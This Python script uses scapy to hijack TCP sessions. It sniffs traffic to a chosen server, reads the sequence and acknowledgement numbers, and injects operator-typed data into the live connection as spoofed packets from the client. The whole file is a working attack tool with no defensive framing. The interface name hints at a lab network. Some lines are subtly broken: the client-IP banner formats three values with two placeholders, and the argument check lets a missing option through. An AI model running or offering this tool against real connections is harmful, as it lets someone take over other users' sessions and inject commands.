#!/usr/bin/python3

import sys
import getopt
from scapy.all import *

dev = "h3-eth0"
srv_port = None
srv_ip = None
client_ip = None

def handle_packet(packet):
    ip = packet.getlayer("IP")
    tcp = packet.getlayer("TCP")
    flags = tcp.sprintf("%flags%")

    print("Got packet %s:%d -> %s:%d [%s]" % (ip.src, tcp.sport, ip.dst, tcp.dport, flags))

    # Check if this is a hijackable packet
    if flags == "A" or flags == "PA":

        # The packet is from server to client
        if tcp.sport == srv_port and ip.src == srv_ip:

            print("Got server sequence " + str(tcp.seq))
            print("Got client sequence " + str(tcp.ack) + "\n")

            print("Hijacking %s:%d -> %s:%d" % (ip.dst, tcp.dport, ip.src, srv_port))
            print("Start sending messagge to the server")

            while True:
                inject_data = input(">> ")
                inject_data = inject_data + "\n"

                # Spoof packet from client
                packet = IP(src=ip.dst, dst=ip.src) \
                         / TCP(sport=tcp.dport, dport=srv_port, seq=tcp.ack, ack=tcp.seq,
                               flags="PA") \
                         / inject_data
                resp = sr1(packet, iface=dev, verbose=False)
                tcp = resp.getlayer("TCP")


def usage():
    print(sys.argv[0])
    print("""
    -c <client_ip> (optional)
    -s <srv_ip>
    -p <srv_port>
    """)
    sys.exit(1)


try:
    cmd_opts = "c:s:p:"
    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-c":
        client_ip = opt[1]
    elif opt[0] == "-s":
        srv_ip = opt[1]
    elif opt[0] == "-p":
        srv_port = int(opt[1])
    else:
        usage()

if not srv_ip and not srv_port:
    usage()

if client_ip:
    print("Hijacking TCP connections from %s to " + \
          "%s on port %d" % (client_ip, srv_ip, srv_port))
    filter = "tcp and port " + str(srv_port) + \
             " and host " + srv_ip + " and host " + client_ip
else:
    print("Hijacking all TCP connections to " + \
          "%s on port %d" % (srv_ip, srv_port))
    filter = "tcp and port " + str(srv_port) + " and host " + srv_ip

sniff(iface=dev, store=0, filter=filter, prn=handle_packet)
